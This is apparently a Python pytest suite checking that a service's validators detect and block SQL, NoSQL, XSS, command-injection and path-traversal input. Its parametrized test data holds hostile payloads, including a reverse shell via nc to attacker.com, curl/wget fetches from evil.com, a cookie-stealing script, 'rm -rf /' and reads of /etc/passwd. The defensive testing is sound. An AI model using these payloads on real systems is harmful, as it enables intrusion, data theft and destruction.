"""Comprehensive input validation tests for BIOwerk services.

Tests for:
- SQL injection prevention
- NoSQL injection prevention
- XSS prevention
- Command injection prevention
- Path traversal prevention
- Input size limits
- Type validation
"""

import pytest
from fastapi.testclient import TestClient
from matrix.api_models import (
    OutlineRequest,
    DraftRequest,
    EditRequest,
    SummarizeRequest,
    PlanRequest,
    IngestTableRequest,
    StoryboardRequest,
    validate_safe_string,
)
from matrix.errors import ValidationError
from matrix.validation import (
    check_xss,
    check_sql_injection,
    check_nosql_injection,
    check_command_injection,
    check_path_traversal,
    sanitize_string,
)
from pydantic import ValidationError as PydanticValidationError


# =============================================================================
# SQL Injection Tests
# =============================================================================

class TestSQLInjection:
    """Test SQL injection detection and prevention."""

    @pytest.mark.parametrize("payload", [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "admin' --",
        "' UNION SELECT * FROM users--",
        "1' AND 1=1 --",
        "' OR 1=1--",
        "admin'/*",
        "' OR 'x'='x",
        "; DELETE FROM products WHERE '1'='1",
        "1; DROP TABLE items",
    ])
    def test_sql_injection_detection(self, payload):
        """Test that SQL injection patterns are detected."""
        assert check_sql_injection(payload), f"Failed to detect SQL injection: {payload}"

    @pytest.mark.parametrize("payload", [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT password FROM users--",
    ])
    def test_sql_injection_blocked_in_models(self, payload):
        """Test that SQL injection is blocked in Pydantic models."""
        with pytest.raises(ValidationError) as exc_info:
            req = OutlineRequest(topic=payload)
        assert "sql_injection" in str(exc_info.value).lower() or "dangerous" in str(exc_info.value).lower()

    @pytest.mark.parametrize("payload", [
        "'; DROP TABLE users; --",
        "admin' OR '1'='1",
    ])
    def test_sql_injection_blocked_by_sanitizer(self, payload):
        """Test that SQL injection is blocked by sanitize_string."""
        with pytest.raises(ValidationError) as exc_info:
            sanitize_string(payload, "test_field")
        assert exc_info.value.details["attack_type"] == "sql_injection"


# =============================================================================
# NoSQL Injection Tests
# =============================================================================

class TestNoSQLInjection:
    """Test NoSQL injection detection and prevention."""

    @pytest.mark.parametrize("payload", [
        '{"$where": "this.credits == this.debits"}',
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '$where: "1==1"',
        '{"$regex": ".*"}',
    ])
    def test_nosql_injection_detection(self, payload):
        """Test that NoSQL injection patterns are detected."""
        assert check_nosql_injection(payload), f"Failed to detect NoSQL injection: {payload}"

    @pytest.mark.parametrize("payload", [
        '{"$ne": null}',
        '{"$where": "malicious code"}',
    ])
    def test_nosql_injection_blocked_in_models(self, payload):
        """Test that NoSQL injection is blocked in Pydantic models."""
        with pytest.raises(ValidationError) as exc_info:
            req = EditRequest(text=payload)
        assert "nosql_injection" in str(exc_info.value).lower() or "dangerous" in str(exc_info.value).lower()


# =============================================================================
# XSS (Cross-Site Scripting) Tests
# =============================================================================

class TestXSSPrevention:
    """Test XSS attack detection and prevention."""

    @pytest.mark.parametrize("payload", [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<body onload=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<script>fetch('http://evil.com?cookie='+document.cookie)</script>",
        "onerror=alert(1)",
        "<embed src='data:text/html,<script>alert(1)</script>'>",
        "<object data='javascript:alert(1)'>",
    ])
    def test_xss_detection(self, payload):
        """Test that XSS patterns are detected."""
        assert check_xss(payload), f"Failed to detect XSS: {payload}"

    @pytest.mark.parametrize("payload", [
        "<script>alert('XSS')</script>",
        "javascript:alert(1)",
        "<img src=x onerror=alert(1)>",
    ])
    def test_xss_blocked_in_models(self, payload):
        """Test that XSS attacks are blocked in Pydantic models."""
        with pytest.raises(ValidationError) as exc_info:
            req = DraftRequest(section_title=payload)
        assert "xss" in str(exc_info.value).lower() or "dangerous" in str(exc_info.value).lower()


# =============================================================================
# Command Injection Tests
# =============================================================================

class TestCommandInjection:
    """Test command injection detection and prevention."""

    @pytest.mark.parametrize("payload", [
        "; rm -rf /",
        "| cat /etc/passwd",
        "`whoami`",
        "$(curl http://evil.com)",
        "${IFS}cat${IFS}/etc/passwd",
        "; nc attacker.com 1234 -e /bin/sh",
        "& ping -c 10 127.0.0.1 &",
        "| wget http://evil.com/backdoor.sh",
    ])
    def test_command_injection_detection(self, payload):
        """Test that command injection patterns are detected."""
        assert check_command_injection(payload), f"Failed to detect command injection: {payload}"

    @pytest.mark.parametrize("payload", [
        "; rm -rf /",
        "| cat /etc/passwd",
        "`whoami`",
    ])
    def test_command_injection_blocked_in_models(self, payload):
        """Test that command injection is blocked in Pydantic models."""
        with pytest.raises(ValidationError) as exc_info:
            req = PlanRequest(goal=payload)
        assert "command_injection" in str(exc_info.value).lower() or "dangerous" in str(exc_info.value).lower()


# =============================================================================
# Path Traversal Tests
# =============================================================================

class TestPathTraversal:
    """Test path traversal detection and prevention."""

    @pytest.mark.parametrize("payload", [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
    ])
    def test_path_traversal_detection(self, payload):
        """Test that path traversal patterns are detected."""
        assert check_path_traversal(payload), f"Failed to detect path traversal: {payload}"

    @pytest.mark.parametrize("payload", [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
    ])
    def test_path_traversal_blocked_in_models(self, payload):
        """Test that path traversal is blocked in Pydantic models."""
        with pytest.raises(ValidationError) as exc_info:
            req = OutlineRequest(topic=payload)
        assert "path_traversal" in str(exc_info.value).lower() or "dangerous" in str(exc_info.value).lower()


# =============================================================================
# Input Size Limit Tests
# =============================================================================

class TestInputSizeLimits:
    """Test input size validation."""

    def test_oversized_string_rejected(self):
        """Test that strings exceeding MAX_STRING_LENGTH are rejected."""
        oversized = "A" * 10001  # MAX_STRING_LENGTH is 10000
        with pytest.raises(PydanticValidationError) as exc_info:
            req = OutlineRequest(topic=oversized)
        assert "max_length" in str(exc_info.value).lower() or "too long" in str(exc_info.value).lower()

    def test_max_size_string_accepted(self):
        """Test that strings at MAX_STRING_LENGTH are accepted."""
        max_size = "A" * 10000
        req = OutlineRequest(topic=max_size)
        assert req.topic == max_size

    def test_oversized_list_rejected(self):
        """Test that lists exceeding MAX_LIST_LENGTH are rejected."""
        oversized_list = ["item"] * 1001  # MAX_LIST_LENGTH is 1000
        with pytest.raises(ValidationError) as exc_info:
            req = DraftRequest(outline=oversized_list)
        assert "max_length" in str(exc_info.value).lower() or "exceeds maximum" in str(exc_info.value).lower()

    def test_max_size_list_accepted(self):
        """Test that lists at MAX_LIST_LENGTH are accepted."""
        max_list = ["item"] * 1000
        req = DraftRequest(outline=max_list, section_title="Test")
        assert len(req.outline) == 1000


# =============================================================================
# Type Validation Tests
# =============================================================================

class TestTypeValidation:
    """Test type validation and coercion."""

    def test_string_required_fields(self):
        """Test that required string fields are validated."""
        with pytest.raises(PydanticValidationError):
            req = EditRequest(text=None)  # text is required

    def test_strict_mode_validation(self):
        """Test that strict mode prevents type coercion."""
        # In strict mode, extra fields should be rejected
        with pytest.raises(PydanticValidationError):
            req = OutlineRequest(
                topic="Test",
                extra_field="should_be_rejected"
            )

    def test_integer_validation(self):
        """Test integer field validation."""
        # Valid integer
        req = StoryboardRequest(topic="Test", num_slides=10)
        assert req.num_slides == 10

        # Invalid integer (out of range)
        with pytest.raises(PydanticValidationError):
            req = StoryboardRequest(topic="Test", num_slides=1000)  # max is 100


# =============================================================================
# Required Field Validation Tests
# =============================================================================

class TestRequiredFieldValidation:
    """Test required field validation."""

    def test_outline_requires_topic_or_goal(self):
        """Test that OutlineRequest requires topic or goal."""
        # Should raise when calling validate_required_fields()
        req = OutlineRequest()
        with pytest.raises(ValidationError) as exc_info:
            req.validate_required_fields()
        assert "topic" in str(exc_info.value).lower() or "goal" in str(exc_info.value).lower()

    def test_edit_requires_text(self):
        """Test that EditRequest requires text."""
        with pytest.raises(PydanticValidationError):
            req = EditRequest()  # Missing required 'text' field

    def test_plan_requires_goal(self):
        """Test that PlanRequest requires goal."""
        with pytest.raises(PydanticValidationError):
            req = PlanRequest()  # Missing required 'goal' field


# =============================================================================
# Safe String Validation Tests
# =============================================================================

class TestSafeStringValidation:
    """Test safe string validation function."""

    def test_valid_strings_accepted(self):
        """Test that valid strings are accepted."""
        valid_strings = [
            "Hello World",
            "This is a normal sentence.",
            "Numbers: 12345",
            "Email: user@example.com",
            "URL: https://example.com",
            "Multiple words with spaces and punctuation!",
        ]
        for s in valid_strings:
            assert validate_safe_string(s, "test") == s

    def test_control_characters_rejected(self):
        """Test that control characters are rejected."""
        # Test null byte
        with pytest.raises(ValidationError):
            validate_safe_string("test\x00data", "test")

        # Test other control characters
        with pytest.raises(ValidationError):
            validate_safe_string("test\x01\x02", "test")

    def test_non_string_rejected(self):
        """Test that non-string types are rejected."""
        with pytest.raises(ValidationError) as exc_info:
            validate_safe_string(12345, "test")
        assert "must be a string" in str(exc_info.value)


# =============================================================================
# Integration Tests
# =============================================================================

class TestValidationIntegration:
    """Integration tests for complete validation flow."""

    def test_valid_outline_request(self):
        """Test that valid OutlineRequest passes all validations."""
        req = OutlineRequest(
            topic="Machine Learning Fundamentals",
            context="For beginners in computer science"
        )
        req.validate_required_fields()
        assert req.topic == "Machine Learning Fundamentals"
        assert req.context == "For beginners in computer science"

    def test_valid_draft_request(self):
        """Test that valid DraftRequest passes all validations."""
        req = DraftRequest(
            section_title="Introduction",
            outline=["Intro", "Body", "Conclusion"],
            context="Technical document"
        )
        req.validate_required_fields()
        assert req.section_title == "Introduction"
        assert len(req.outline) == 3

    def test_valid_edit_request(self):
        """Test that valid EditRequest passes all validations."""
        req = EditRequest(
            text="This is the original text.",
            feedback="Make it more concise",
            edit_type="improve"
        )
        assert req.text == "This is the original text."
        assert req.feedback == "Make it more concise"
        assert req.edit_type == "improve"

    def test_multiple_validation_errors(self):
        """Test that multiple validation errors are reported."""
        # Try to create request with both oversized and malicious content
        # The validation should catch at least one of these issues
        with pytest.raises((ValidationError, PydanticValidationError)):
            req = OutlineRequest(topic="<script>alert('XSS')</script>")


# =============================================================================
# Error Message Tests
# =============================================================================

class TestErrorMessages:
    """Test that error messages don't leak sensitive information."""

    def test_validation_error_message_safe(self):
        """Test that validation errors don't leak system information."""
        try:
            req = OutlineRequest(topic="'; DROP TABLE users--")
        except ValidationError as e:
            # Error message should mention the attack type but not reveal system details
            assert "sql_injection" in str(e).lower() or "dangerous" in str(e).lower()
            # Should not contain stack traces or file paths
            assert "/home/" not in str(e)
            assert "Traceback" not in str(e)

    def test_pydantic_error_message_structure(self):
        """Test that Pydantic validation errors have proper structure."""
        try:
            req = EditRequest()  # Missing required field
        except PydanticValidationError as e:
            errors = e.errors()
            assert isinstance(errors, list)
            assert len(errors) > 0
            # Each error should have standard Pydantic structure
            for error in errors:
                assert "loc" in error
                assert "msg" in error
                assert "type" in error


# =============================================================================
# Edge Cases
# =============================================================================

class TestEdgeCases:
    """Test edge cases and boundary conditions."""

    def test_empty_string_handling(self):
        """Test that empty strings are handled correctly."""
        # Empty optional fields should be allowed
        req = OutlineRequest(topic="Test", context="")
        assert req.context == ""

    def test_unicode_handling(self):
        """Test that Unicode characters are handled correctly."""
        unicode_text = "Hello 世界 🌍"
        req = OutlineRequest(topic=unicode_text)
        assert req.topic == unicode_text

    def test_special_characters(self):
        """Test that allowed special characters work correctly."""
        special_text = "Test with @#$%^&*()_+-=[]{}|;:',.<>?/~ characters"
        req = OutlineRequest(topic=special_text)
        assert req.topic == special_text

    def test_newlines_and_whitespace(self):
        """Test that newlines and whitespace are preserved."""
        multiline_text = "Line 1\nLine 2\n\tIndented line"
        req = EditRequest(text=multiline_text)
        assert req.text == multiline_text


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
